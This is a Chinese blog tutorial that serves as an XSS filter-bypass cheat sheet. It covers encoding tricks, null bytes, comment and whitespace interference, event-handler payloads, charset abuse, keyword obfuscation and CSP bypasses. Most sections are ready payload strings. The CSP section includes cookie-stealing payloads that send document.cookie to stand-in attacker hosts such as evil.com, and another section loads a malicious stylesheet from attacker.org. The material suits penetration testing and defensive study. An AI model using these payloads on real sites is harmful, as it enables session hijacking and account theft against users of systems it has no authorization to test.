# 原创
：  （27）【xss绕过】一般测试步骤、绕过方法：触发事件、干扰、编码……

# （27）【xss绕过】一般测试步骤、绕过方法：触发事件、干扰、编码……

**目录**

[一、进行xss测试步骤 ](#%E8%BF%9B%E8%A1%8Cxss%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4)

[二、引号尖括号](#%E5%BC%95%E5%8F%B7%E5%B0%96%E6%8B%AC%E5%8F%B7)

[2.1、方法一:单双引号等符号乱加一通](#2.1%E3%80%81%E6%96%B9%E6%B3%95%E4%B8%80%3A%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%AD%89%E7%AC%A6%E5%8F%B7%E4%B9%B1%E5%8A%A0%E4%B8%80%E9%80%9A)

[2.2、方法二：用其他编码来替代引号](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E7%94%A8%E5%85%B6%E4%BB%96%E7%BC%96%E7%A0%81%E6%9D%A5%E6%9B%BF%E4%BB%A3%E5%BC%95%E5%8F%B7)

[2.3、方法三：当尖括号被过滤时](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%BD%93%E5%B0%96%E6%8B%AC%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6)

[三、重写绕过](#%E9%87%8D%E5%86%99%E7%BB%95%E8%BF%87)

[四、特殊符号干扰](#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0)

[4.1、方法一：加各种符号干扰](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%A0%E5%90%84%E7%A7%8D%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0)

[4.2、方法二：添加注释干扰](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%B7%BB%E5%8A%A0%E6%B3%A8%E9%87%8A%E5%B9%B2%E6%89%B0)

[五、使用‘空’干扰](#%E4%BD%BF%E7%94%A8%E2%80%98%E7%A9%BA%E2%80%99%E5%B9%B2%E6%89%B0)

[5.1、方法一：空格、回车、Tab](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%A9%BA%E6%A0%BC%E3%80%81%E5%9B%9E%E8%BD%A6%E3%80%81Tab)

[5.2、方法二：制表符、换行符、回车符](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%B6%E8%A1%A8%E7%AC%A6%E3%80%81%E6%8D%A2%E8%A1%8C%E7%AC%A6%E3%80%81%E5%9B%9E%E8%BD%A6%E7%AC%A6)

[5.3、方法三：空字节](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E7%A9%BA%E5%AD%97%E8%8A%82)

[六、编码：](#%E7%BC%96%E7%A0%81%EF%BC%9A)

[6.1、方法一：符号编码](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%AC%A6%E5%8F%B7%E7%BC%96%E7%A0%81)

[6.2、方法二：对语句进行编码](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%AF%B9%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81)

[七、加密解密算法](#%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95)

[7.1、编码一：decodeURIComponent()](#%E7%BC%96%E7%A0%81%E4%B8%80%EF%BC%9AdecodeURIComponent%28%29)

[7.2、编码二：encodeURI()](#%E7%BC%96%E7%A0%81%E4%BA%8C%EF%BC%9AencodeURI%28%29)

[7.3、编码三：escape()](#%E7%BC%96%E7%A0%81%E4%B8%89%EF%BC%9Aescape%28%29)

[7.4、编码四：base64编码](#%E7%BC%96%E7%A0%81%E5%9B%9B%EF%BC%9Abase64%E7%BC%96%E7%A0%81)

[八、js](#js)

[8.1、js伪协议](#js%E4%BC%AA%E5%8D%8F%E8%AE%AE)

[8.2、js远程包含](#js%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB)

[九、HTML标签属性](#HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7)

[9.1、方法一：利用HTML的标签](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8HTML%E7%9A%84%E6%A0%87%E7%AD%BE)

[9.2、方法二：进一步对标签属性进行编码](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%AF%B9%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81)

[十、CSS样式表](#CSS%E6%A0%B7%E5%BC%8F%E8%A1%A8)

[10.1、方法一：标签属性值利用](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E5%88%A9%E7%94%A8)

[10.2、方法二：IE 下利用 expression](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AIE%20%E4%B8%8B%E5%88%A9%E7%94%A8%20expression)

[10.3、方法三：调用外部js](#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8js)

[十一、转义字符](#%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6)

[十二、数据溢出](#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA)

[12.1、方法一：绕过长度限制](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6)

[12.2、方法二：打通文本框](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%89%93%E9%80%9A%E6%96%87%E6%9C%AC%E6%A1%86)

[十三、JavaScript 事件](#JavaScript%20%E4%BA%8B%E4%BB%B6)

[13.1、方法一：触发事件](#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6)

[13.2、方法二：自发事件 ](#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E8%87%AA%E5%8F%91%E4%BA%8B%E4%BB%B6)

[十四、字符集编码](#%E5%AD%97%E7%AC%A6%E9%9B%86%E7%BC%96%E7%A0%81)

[十五、双引号配对](#%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%85%8D%E5%AF%B9)

[十六、语法漏洞](#%E8%AF%AD%E6%B3%95%E6%BC%8F%E6%B4%9E)

[十七、Unicode分隔符](#Unicode%E5%88%86%E9%9A%94%E7%AC%A6)

[十八、敏感关键字符绕过](#%E5%8D%81%E5%85%AB%E3%80%81%E6%95%8F%E6%84%9F%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87)

[ 18.1、字符串拼接与混淆](#%C2%A018.1%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E4%B8%8E%E6%B7%B7%E6%B7%86)

[18.2、编码解码](#18.2%E3%80%81%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81)

[18.3、location.*、window.name](#18.3%E3%80%81location.*%E3%80%81window.name)

[18.4、绕过-过滤“.”](#18.4%E3%80%81%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4%E2%80%9C.%E2%80%9D)

[18.5、绕过-过滤“()”](#18.5%E3%80%81%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4%E2%80%9C%28%29%E2%80%9D)

[18.6、绕过-过滤空格](#18.6%E3%80%81%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC)

[18.7、svg标签](#18.7%E3%80%81svg%E6%A0%87%E7%AD%BE)

[十九、内容安全策略（CSP）绕过](#%E5%8D%81%E4%B9%9D%E3%80%81%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89%E7%BB%95%E8%BF%87)

[19.1、CSP配置错误](#19.1%E3%80%81CSP%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF)

[CSP策略配置错误的场景：](#CSP%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E7%9A%84%E5%9C%BA%E6%99%AF%EF%BC%9A)

[19.2、unsafe-inline下的绕过](#19.2%E3%80%81unsafe-inline%E4%B8%8B%E7%9A%84%E7%BB%95%E8%BF%87)

[19.3、script-src'self'规则绕过](#19.3%E3%80%81script-src'%20rel=)

[19.4、CRLF导致的绕过](#19.4%E3%80%81CRLF%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BB%95%E8%BF%87)

---


（和SQL注入有相同点，但是还有很多补充点）

---


## 一、进行xss测试步骤 

> 
 <br/> 1、找框，然后见框就插<br/> 1、框中输入一些字符（要方便在前端代码中找到位置，如66666）<br/> 2、按下Ctrl+Shift+I（有的的是F12应该）进入开发者模式，然后按Ctrl+F键，搜索框搜索66666<br/> 3、一般在value="66666"中，或包含在div、span等其他的标签中<br/> 4、一般先考虑闭合标签再构造或利用伪协议，或者用burp的payload等方法

WAF一般可以检测到变形script
一般手工试有没有可能有xss漏洞
然后再使用burp等工具来跑



---


## 二、引号尖括号

> 
<h3>2.1、方法一:单双引号等符号乱加一通</h3>
（这个还是交给burp工具中的payload来做吧）
<h3>2.2、方法二：用其他编码来替代引号</h3>
双引号 （"）       &amp;#34;        &amp;quot;
符号（&amp;）        &amp;#38;        &amp;amp;
小于号（&lt;）        &amp;#60;        &amp;lt;
大于号（&gt;）        &amp;#62;        &amp;gt;

原始：&lt;script&gt;alert("XSS")&lt;/script&gt;
变换1：&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;
变换2：&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;<br/> ……
（一般都会对script进行拦截，所以考虑结合用）

<h3>2.3、方法三：当尖括号被过滤时</h3>
我们可以利用 /进行结束
但是只在HTML4及以前，现在没用了


### 2.2、方法二：用其他编码来替代引号

---


## 三、重写绕过

> 
&lt;scri&lt;script&gt;pt&gt;alert("hello world!")&lt;/scri&lt;/script&gt;pt&gt;
如果只循环一次的话，只会去掉检测到第一个&lt;script&gt;，然后又形成了一个新的&lt;script&gt;
如果是替换的话，另当别论


---


## 四、特殊符号干扰

> 
<h3>4.1、方法一：加各种符号干扰</h3>
{(@/ %#^&amp;·····
在html中"/"表结束

<h3>4.2、方法二：添加注释干扰</h3>
&lt;scri&lt;!--hello--&gt;pt&gt;alert("XSS")&lt;/scri&lt;!--hello--&gt;pt&gt;
&lt;scri&lt;!--hello--&gt;pt&gt;解析执行时候又回了&lt;script&gt;
后端可能无法识别到script漏洞，但执行的时候注释里面的被注释掉了，就又变回了&lt;script&gt;


### 4.2、方法二：添加注释干扰

---


## 五、使用‘空’干扰

> 
<h3>5.1、方法一：空格、回车、Tab</h3>
<hr/>
<h3>5.2、方法二：制表符、换行符、回车符</h3>
其实也就是对这些符号的一个转码
然后返回客户端解析执行的时候能被正确执行
<table cellpadding="0" cellspacing="0"><tbody>| Type | Tab | 换行 | 回车 
| URL | %09 | %10 | %13 
| MinimalSizedHex | &amp;#x9 | &amp;#xA | &amp;#xD 
| MaximumSizedHex | &amp;#x0000009; | &amp;#x000000A; | &amp;#x000000D; 
| MinimumSizedDecimal | &amp;#9 | &amp;#10 | &amp;#13 
| MaximumSizedDecimal | &amp;#x0000009; | &amp;#x0000009; | &amp;#0000009; 
</tbody></table>
<hr/>
<h3>5.3、方法三：空字节</h3>
用于PHP 5.3.8以下的版本
空字符(%00)使得过滤器不能看到完整的&lt;script&gt;标签(IE6.0,IE7.0)
常用来绕过mod_security防火墙
&lt;s%00cript&gt;alert(1);&lt;/s%00cript&gt;
&lt;s%00c%00r%00i%00p%00t&gt;alert(1);&lt;/s%00c%00r%00%00ip%00t&gt;


### 5.2、方法二：制表符、换行符、回车符

---


---


## 六、编码：

> 
根本原则：后台识别不出来，但是传到客户端服务器后能够被正常的解析执行
<h3>6.1、方法一：符号编码</h3>
#：%23;<br/> . ：%2e;<br/> + ：%2b;<br/> &lt; ：%3c;<br/> &gt;： %3e;<br/> !：%21;<br/> 空格：%20;<br/> &amp;： %26;<br/> (：%28;<br/> )： %29;<br/> ”：%22;<br/> ’ ：%27;
<hr/>
<h3>6.2、方法二：对语句进行编码</h3>
首先使用的编码，要是HTML最后能够解析执行的
目前国内HTML流行的编码有有utf-8、gb2312这两种编码方法
这里可能需要考虑，如果当你输入的是编码，如果又给你编码一次，最后解码的时候，可能只能解码到编码后的语句


### 6.2、方法二：对语句进行编码

<br/>  

---


## 七、加密解密算法

> 

<h3>7.1、编码一：decodeURIComponent()</h3>
浏览器支持（常用的）：Google、Microsoft Edge、火狐
函数对 URI 组件进行编码，此函数对特殊字符进行编码。此外，它还对以下字符进行编码： , / ? : @ &amp; = + $ #
使用：encodeURIComponent(uri)
示例：
var uri = "https://…………";
var res = encodeURIComponent(uri);
<hr/>

<h3>7.2、编码二：encodeURI()</h3>
浏览器支持（常用的）：Google、Microsoft Edge、火狐
函数通过将特定字符的每个实例替换为一个、两个、三或四转义序列来对统一资源标识符 (URI) 进行编码
此函数对特殊字符进行编码，除了： , / ? : @ &amp; = + $ #（请使用 encodeURIComponent() 对这些字符进行编码
使用：encodeURI(uri)
示例：
var uri = "my test.asp?name=ståle&amp;car=saab";
var res = encodeURI(uri);

<hr/>
<h3>7.3、编码三：escape()</h3>
escape()对字符串进行编码，不推荐使用 escape() 函数（有的浏览器已经废弃）
使字符串具有可移植性，这样它就可以通过任何网络传输到任何支持 ASCII 字符的计算机。
此函数对特殊字符进行编码，但以下字符除外： * @ - _ + . /

使用：escape(string)
示例：
document.write(escape("Need tips? Visit W3School!"));

<hr/>
<h3>7.4、编码四：**base64编码**</h3>
使得二进制数据在解释成 radix-64 的表现形式后能够用 ASCII 字符串的格式表示出来
JavaScript 中，有两个函数被分别用来处理解码和编码 **base64** 字符串
atob() //ASCII to Base64
btoa() //Base64 to ASCII

示例：
var str = "xxx";
var enc = window.btoa(str);
var dec = window.atob(enc);


### 7.2、编码二：encodeURI()

---


### 7.4、编码四：**base64编码**

---


## 八、js

> 
<h3>8.1、js伪协议</h3>
形式：javascript:[代码]
示例：&lt;table background="javascript:alert(1)"&gt;&lt;/table&gt;
支持伪协议的属性有：href,lowsrc,bgsound,background,action,dynsrc
<hr/>
<h3>8.2、js远程包含</h3>
&lt;link rel=import href="http://xxx/a.js"&gt;


### 8.2、js远程包含

---


## 九、HTML标签属性

> 
<h3>9.1、方法一：利用HTML的标签</h3>
通常HTML标记中的属性都支持javascript:[code]伪协议的形式
并非所有浏览器都支持,并非所有的属性值都能产生xss，可以使用下面的属性值来测试 
href=、src=、lowsrc=、bgsound=、background=、value=、action=、dynsrc=
示例：
&lt;table background="javascript:alert(/xss/)"&gt;&lt;/table&gt;
&lt;img src="javascript:alert('xss');"&gt;&lt;/img&gt;
<hr/>

<h3>9.2、方法二：进一步对标签属性进行编码</h3>
利用HTML支持ASCII码，将属性值转码为ASCII码的形式
&lt;img src="javascript:alert('xss');"&gt;
转码后
&lt;img src="javascrip&amp;#116&amp;#58alert(/xss/);"&gt;


### 9.2、方法二：进一步对标签属性进行编码

---


## 十、CSS样式表

> 
(一般就是利用它的style属性或者标签)
<h3>10.1、方法一：标签属性值利用</h3>
（浏览器的不同会导致CSS构造不一样）
&lt;div style="background-image:url(javascript:alert('XSS'))&gt;&lt;/div&gt;
&lt;style&gt;
body {background-image:url("javascript:alert('xss')")}
&lt;/style&gt;
<hr/>

<h3>10.2、方法二：IE 下利用 expression</h3>

CSS中使用expression只有IE才能识别。IE5及其以后版本支持在CSS中使用expression，用来把CSS属性和Javascript表达式关联起来，这里的CSS属性可以是元素固有的属性，也可以是自定义属性
eg：
&lt;div style="color: expression(alert('XSS'))"&gt;
过滤器会检查关键字 style（因此后面不能跟&lt;），再 expression：
构造：
&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;
<hr/>
<h3>10.3、方法三：调用外部js</h3>
IE 浏览器支持在 CSS 中扩展 JavaScript，称为动态特性。
允许加载一个外部 CSS 样式表是存在安全风险的，导致可以在原始页面中执行js代码
&lt;style&gt;
@im\port url("http://attacker.org/malicious.css");
加\是为了绕过过滤器检测，但IE能识别
&lt;/style&gt;
malicious.css：
body {undefined
    color: expression(alert('XSS'));
}<br/><br/>  


<table><tbody>|标签|描述
|&lt;style&gt;|定义样式定义。
|&lt;link&gt;|定义资源引用。
|&lt;div&gt;|定义文档中的节或区域（块级）。
|&lt;span&gt;|定义文档中的行内的小块或区域。
|&lt;font&gt;|规定文本的字体、字体尺寸、字体颜色。不赞成使用。请使用样式。
|&lt;basefont&gt;|定义基准字体。不赞成使用。请使用样式。
|&lt;center&gt;|对文本进行水平居中。不赞成使用。请使用样式。
</tbody></table>


### 10.2、方法二：IE 下利用 expression

---


---


<br/>  

## 十一、转义字符

> 
所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。 而C语言中定义了一些字母前加"\"来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思
能够用来绕过一些简单的过滤器
例如：
&lt;img src=`javascript：alert(\"XSS\")`&gt;
&lt;img src=`javascript：alert(\\"XSS\\")`&gt;



---


## 十二、数据溢出

> 
<h3>12.1、方法一：绕过长度限制</h3>

如果是后端服务器限制长度的话，那就无用功了。
如果限制10个，那就只取10个
就应该考虑考虑其他方法了

<hr/>
<h3>12.2、方法二：打通文本框</h3>
绕过有2个挨着的文本框，通过注释第一个之后的HTML代码，并注释第二个之前的HTML代码,  从而"打通" 两个input标签，实现了绕过长度的限制
示例：
第一个文本框：&lt;input id=1 type="text" value="$var1" /&gt;
（输入"&gt; &lt;!--）
第二个文本框：&lt;input id=2 type="text" value="$var2" /&gt;
（输入--&gt; &lt;script&gt;alert(1)&lt;/script&gt;）

最终：&lt;script&gt;alert(1)&lt;/script&gt;" /&gt;&lt;script&gt;alert(1)&lt;/script&gt;" /&gt;


### 12.2、方法二：打通文本框

---


## 十三、JavaScript 事件

> 
<h3>13.1、方法一：触发事件</h3>
事件是可以被 JavaScript 侦测到的行为。 网页中的每个元素都可以产生某些可以触发 JavaScript 函数的事件。比方说，我们可以在用户点击某按钮时产生一个 onClick 事件来触发某个函数。JavaScript使我们有能力创建动态页面，网页中的每一个元素都可以产生某些触发JavaScript函数的事件
（找大概率触发事件）
示例：
&lt;div οnclick="alert('xss')"&gt;当有人点击它后就会被执行。
(存在少量事件没有被过滤器过滤，要试出来)
eg：onmouseenter 事件：&lt;div οnmοuseenter="alert('xss')"&gt;当用户鼠标移动到 div 上时就会触发代码
(结合其他的绕过，可以在属性和=之间插入空格……)<br/>  
<table><tbody>|属性|当以下情况发生时，出现此事件|FF|N|IE
|onabort|图像加载被中断|1|3|4
|onblur|元素失去焦点|1|2|3
|onchange|用户改变域的内容|1|2|3
|onclick|鼠标点击某个对象|1|2|3
|ondblclick|鼠标双击某个对象|1|4|4
|onerror|当加载文档或图像时发生某个错误|1|3|4
|onfocus|元素获得焦点|1|2|3
|onkeydown|某个键盘的键被按下|1|4|3
|onkeypress|某个键盘的键被按下或按住|1|4|3
|onkeyup|某个键盘的键被松开|1|4|3
|onload|某个页面或图像被完成加载|1|2|3
|onmousedown|某个鼠标按键被按下|1|4|4
|onmousemove|鼠标被移动|1|6|3
|onmouseout|鼠标从某元素移开|1|4|4
|onmouseover|鼠标被移到某元素之上|1|2|3
|onmouseup|某个鼠标按键被松开|1|4|4
|onreset|重置按钮被点击|1|3|4
|onresize|窗口或框架被调整尺寸|1|4|4
|onselect|文本被选定|1|2|3
|onsubmit|提交按钮被点击|1|2|3
|onunload|用户退出页面|1|2|3
</tbody></table>

<hr/>
<h3>13.2、方法二：自发事件 </h3>
就算别人客户端没点击你构造的代码，你也能自己产生事件来执行代码)
比如click、mouseover、load……
&lt;input type="button" value="click me" οnclick="alert('click me')"/&gt;
&lt;img src="#" οnerrοr=alert(/xss/)&gt;
onResume、onReverse、onRowDelete、onRowInserted、OnSeek、onSeek、onSynchRestored、onTimeError、onTrackChange、onURLFlip、onRepeat、onMediaComplete、onMediaComplete


### 13.2、方法二：自发事件 

<br/>  

<br/>  

---


## 十四、字符集编码

> 
多见于IE中，要是能控制字符集编码，那就稳了
eg:
原始：
http://xxx.xxx.com/utf-32-1.php?charset=utf-8&amp;name=father
插入预期：
http://xxx.xxx.com/utf-32-1.php?charset=utf-8&amp;name=”&gt;&lt;img  src=x οnerrοr=prompt(0);&gt;
修改编码（这里改为了32）
http://xxx.xxx.com/utf-32-1.php?charset=utf-32&amp;name=%E2%88%80%E3%B8%80%E3%B0
%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80


---


## 十五、双引号配对

> 
通过在一个构造三个在一个标签里，另一个在其他位置
eg：<br/><br/> &lt;img"""&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;
应该是前2个双引号为一对，第三个和后面那一个双引号是一对
但是第一个和第三被认为是一对了
相当于：&lt;img&gt;&lt;script&gt;alert('xss')&lt;/script&gt;"&amp;gt;


---


## 十六、语法漏洞

> 
RFC声明中，节点名称不能是空格，否则在js中不能运行
并且&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;
eg：
&lt;script&gt;alert(1);&lt;/script&gt;
构造：
&lt;%0ascript&gt;alert(1);&lt;/script&gt;
&lt;%0bscript&gt;alert(1);&lt;/script&gt;
……


---


## 十七、Unicode分隔符

> 
[on\w+\s*]规则过滤了所有on事件，可以使用fuzzing方法测试0×00到0xff验证有效性<br/><br/> x0b在Mod_security中已经被过滤，绕过的方法
&lt;a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\
x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'&gt;


---


---


## 十八、敏感关键字符绕过

> 
<h3> 18.1、字符串拼接与混淆</h3>
JavaScript中的对象方法可通过数组的方式进行调用
eg：调用alert函数：
window['alert'](/xss/);
是字符串，那么自然就可以通过拼接的方式进行混淆
window['al'+'ert'](/xss/)
<hr/>
<h3>18.2、编码解码</h3>
通过各种编码注入，然后解码后来实现绕过
HTML进制编码、CSS进制编码、Javascript进制编码、URL编码、JSFuck编码
[XSSEE 3.0 Beta - by Monyer (evilcos.me)<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://evilcos.me/lab/xssee/](https://evilcos.me/lab/xssee/)
<hr/>
使用JavaScript自带的Base64编码解码函数实现绕过
btoa函数可以将字符串编码为Base64字符串
atob函数可以将Base64字符串还原
eg：实现与alert(/xss/)相同的效果：
window[atob("YWxl"+"cnQ=")](/xss/)
<hr/>

<h3>18.3、location.*、window.name</h3>
会对输入的敏感关键字进行过滤，可以将XSS代码放置于其他不被浏览器提交至服务端的部分，如location.*、window.name等
<hr/>
location.*的构造如下：
http://example.com/xss.php?input=&lt;input οnfοcus=outerHTML=decodeURI(location.hash)&gt;#&lt;img src=x οnerrοr=alert(/xss/)&gt;
<hr/>
window.name的构造页面如下：
&lt;iframe src="http://example.com/xss.php?input=%3Cinput%20οnfοcus=location=window.name%3E" name="javascript:alert(/xss/)"&gt;&lt;/iframe&gt;
<hr/>
<h3>18.4、绕过-过滤“.”</h3>
在JavaScript中，可以使用with关键字设置变量的作用域，利用此特性可以绕过对“.”的过滤
with(document)alert(cookie);
<hr/>
<h3>18.5、绕过-过滤“()”</h3>
在JavaScript中，可以通过绑定错误处理函数，使用throw关键字传递参数绕过对“()”的过滤
window.οnerrοr=alert; throw 1;
<hr/>
<h3>18.6、绕过-过滤空格</h3>
使用换行符0x09、0x10、0x12、0x13、0x0a等字符代替空格绕过过滤
http://example.com/xss.php?input=&lt;img%0asrc=x%0aοnerrοr=alert(/xss/)&gt;

在标签名称和第一个属性间也可以使用“/”代替空格
&lt;input/οnfοcus=alert(/xss/)&gt;
<hr/>
<h3>18.7、svg标签</h3>
svg内部的标签和语句遵循的规则是直接继承自xml而不是html，区别在于svg内部的script标签中可以允许存在一部分进制或编码后的字符（比如实体编码）
http://example.com/xss.php?input=1"&gt;&lt;svg&gt;&lt;script&gt;alert%26%23x28;1%26%23x29&lt;/script&gt;&lt;/svg&gt;




### 18.2、编码解码

---


---


---


### 18.4、绕过-过滤“.”

---


### 18.6、绕过-过滤空格

---


---


## 十九、内容安全策略（CSP）绕过

> 
<h3>19.1、CSP配置错误</h3>
利用其错误配置对CSP进行绕过
eg：当包含unsafe-inline关键词但未使用nonce或hash策略时，可直接使用事件属性或script标签执行代码。
<hr/>
<h4>CSP策略配置错误的场景：</h4>
策略定义不全或未使用default-src来补全
script-src的源列表包含unsafe-inline（并且没有使用nonce或hash策略）或允许data伪协议。
script-src或object-src源列表包含攻击者可控制的部分源地址（文件上传、JSON Hijacking、SOME攻击），或者包含不安全的库。
源地址列表滥用通配符。<br/> …




> 
<h3>19.2、unsafe-inline下的绕过</h3>
CSP策略：
default-src 'self';script-src 'self' 'unsafe-inline'
<hr/>
绕过方法：
前提：script开启unsafe-inline模式，其余资源仅允许加载同域
<hr/>
方法一：DNS Prefetch
由于link标签最新的rel属性dns-prefetch尚未被加入CSP实现中，使用如下Payload即可发出一条DNS解析请求，在DNS服务器下查看解析日志便可得到如下内容：
&lt;link rel="dns-prefetch" href="[cookie].evil.com"&gt;
<hr/>
方法二：location.href
大部分的网站跳转还是要依赖前端来进行，所以在CSP中是无法对location.href做出限制的，因此可以衍生出大量的绕过方式：
// bypass 1<br/> &lt;script&gt;location='http://eval.com/cookie.php?cookie='+escape(document.cookie);&lt;/script&gt;<br/> // bypass 2<br/> &lt;script&gt;<br/> var a=document.createElement("a");<br/> a.href='http://evil.com/cookie.php?cookie='+escape(document.cookie);<br/> document.body.appendChild(a);<br/> a.click();<br/> &lt;/script&gt;<br/> // bypass 3<br/> &lt;meta http-equiv="refresh" content="1;url=http://evil.com/cookie.php?data=[cookie]"&gt;


---


> 
<h3>19.3、script-src'self'规则绕过</h3>
CSP策略：
default-src 'self'; script-src 'self';
<hr/>
绕过方法：
关闭unsafe-inline模式，所有资源仅允许加载同域
利用：重定向（302跳转）导致的绕过


> 
<h3>19.4、CRLF导致的绕过</h3>
为使注入的XSS代码不受CSP影响
HTTP响应头中注入[CRLF][CRLF]
将CSP头部分割至HTTP响应体中

